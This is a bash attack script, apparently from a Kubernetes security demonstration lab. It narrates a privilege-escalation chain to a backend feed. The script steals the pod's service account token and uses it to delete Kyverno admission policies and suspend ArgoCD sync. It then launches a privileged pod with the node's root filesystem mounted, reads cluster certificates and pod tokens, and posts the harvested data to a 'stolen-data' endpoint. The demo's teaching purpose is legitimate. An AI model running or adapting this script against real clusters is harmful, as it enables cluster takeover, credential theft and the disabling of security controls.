#!/bin/bash
# =============================================================================
# Scenario 1 — Privilege Escalation via Service Account Abuse
# attack.sh — runs inside target-app pod using stolen cluster-admin token
#
# Called by backend after swapping SA to over-privileged-sa
# Each step emits a narrated event to the backend event feed
# =============================================================================

set -euo pipefail

BACKEND_URL="${BACKEND_URL:-http://secops-backend:3000}"
NAMESPACE="${NAMESPACE:-secops-lab}"
POD_NAME="${POD_NAME:-target-app}"

# ── Event emitter ─────────────────────────────────────────────────────────────
emit() {
  local phase=$1 severity=$2 title=$3 explanation=$4
  curl -sf -X POST "$BACKEND_URL/internal" \
    -H "Content-Type: application/json" \
    -d "{\"phase\":\"$phase\",\"severity\":\"$severity\",\"title\":\"$title\",\"explanation\":\"$explanation\"}" \
    || true  # Never let event emission fail the attack
}

# ── Step 1: Read service account token ───────────────────────────────────────
emit "ATTACK" "WARNING" \
  "Pod reading mounted service account token" \
  "Token is readable at the default mount path inside the container by any process — including an attacker with exec access."

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

if [ -z "$TOKEN" ]; then
  emit "DETECT" "SUCCESS" \
    "No token found — mount disabled" \
    "automountServiceAccountToken is false. No token exists to steal. Attack cannot proceed past step 1."
  exit 0
fi

# ── Step 2: Token stolen ──────────────────────────────────────────────────────
emit "ATTACK" "CRITICAL" \
  "Token stolen — cluster-admin identity acquired" \
  "Attacker holds a valid cluster-admin token. Every Kubernetes API endpoint is now accessible from inside this container."

APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# ── Step 3: Delete Kyverno policy — no-privileged-containers ─────────────────
emit "ATTACK" "CRITICAL" \
  "Deleting Kyverno policy: no-privileged-containers" \
  "Using stolen token to remove admission policy blocking privileged pod creation. Kyverno engine still running but this rulebook page has been torn out."

kubectl delete clusterpolicy no-privileged-containers \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  --ignore-not-found=true

# ── Step 4: Delete Kyverno policy — no-hostpath-mount ────────────────────────
emit "ATTACK" "CRITICAL" \
  "Deleting Kyverno policy: no-hostpath-mount" \
  "Removing policy preventing node filesystem mounts. Both admission policies gone — Kyverno is now blind to this attack."

kubectl delete clusterpolicy no-hostpath-mount \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  --ignore-not-found=true

# ── Step 5: Suspend ArgoCD sync ───────────────────────────────────────────────
emit "ATTACK" "CRITICAL" \
  "Suspending ArgoCD sync" \
  "Using cluster-admin token to suspend ArgoCD sync for the secops-lab namespace. GitOps cannot recover the cluster while sync is suspended — the attacker has disabled their own eviction."

kubectl patch application secops-lab \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n argocd \
  --type merge \
  -p '{"spec":{"syncPolicy":{"automated":null}}}'

kubectl patch application secops-lab-policies \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n argocd \
  --type merge \
  -p '{"spec":{"syncPolicy":{"automated":null}}}'

# ── Step 6: Create privileged pod ────────────────────────────────────────────
emit "ATTACK" "CRITICAL" \
  "Creating privileged pod with hostPath: /" \
  "Deploying new pod with privileged: true and node root filesystem mounted at /host. Kyverno cannot block this — its policies were deleted by the attacker."

cat <<EOF | kubectl apply \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-attack-pod
  namespace: $NAMESPACE
  labels:
    secops-lab/role: attack-pod
    secops-lab/scenario: privilege-escalation
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: attacker
      image: alpine:latest
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-root
          mountPath: /host
      resources:
        requests:
          cpu: "50m"
          memory: "64Mi"
        limits:
          cpu: "100m"
          memory: "128Mi"
  volumes:
    - name: host-root
      hostPath:
        path: /
  restartPolicy: Never
EOF

# ── Step 7: Wait for pod to be running ───────────────────────────────────────
emit "ATTACK" "CRITICAL" \
  "Waiting for privileged pod to start" \
  "Privileged pod scheduled. Waiting for container runtime to start it."

kubectl wait pod/privileged-attack-pod \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" \
  --for=condition=Ready \
  --timeout=60s

# ── Step 8: Exec into privileged pod and access node filesystem ───────────────
emit "ATTACK" "CRITICAL" \
  "Exec into privileged pod — accessing node filesystem" \
  "Attacker has a shell inside a privileged container with the node filesystem mounted. Reading cluster certificates and pod secrets."

# Read sensitive files from node filesystem
NODE_DATA=$(kubectl exec privileged-attack-pod \
  --token="$TOKEN" \
  --server="$APISERVER" \
  --certificate-authority="$CA" \
  -n "$NAMESPACE" -- sh -c '
    echo "=== Cluster CA cert (first 3 lines) ==="
    head -3 /host/etc/kubernetes/pki/ca.crt 2>/dev/null || echo "path not found (k3s uses different path)"

    echo ""
    echo "=== Kubelet config exists ==="
    ls /host/etc/kubernetes/kubelet.conf 2>/dev/null && echo "FOUND" || echo "not found at this path"

    echo ""
    echo "=== Pod token files on node ==="
    find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | head -5 || echo "none found"

    echo ""
    echo "=== Hostname (node name) ==="
    cat /host/etc/hostname 2>/dev/null || hostname
  ' 2>&1 || echo "exec completed")

# ── Step 9: Report impact ─────────────────────────────────────────────────────
emit "IMPACT" "CRITICAL" \
  "Node filesystem accessible — cluster certificates readable" \
  "The container boundary no longer exists. Attacker can read and write the node filesystem directly including Kubernetes certificates, all pod secrets on this node, and kubelet credentials."

# Send stolen data sample to backend for display in impact panel
curl -sf -X POST "$BACKEND_URL/internal/stolen-data" \
  -H "Content-Type: application/json" \
  -d "{\"scenario\":\"privilege-escalation\",\"data\":$(echo "$NODE_DATA" | jq -Rs .)}" \
  || true

emit "WAITING" "CRITICAL" \
  "Waiting for manual restore — dwell time accumulating" \
  "All controls are disabled. Cluster is compromised. Recovery requires human action. The visitor must click Restore Protection to continue."

echo "Attack complete — waiting for manual restore"
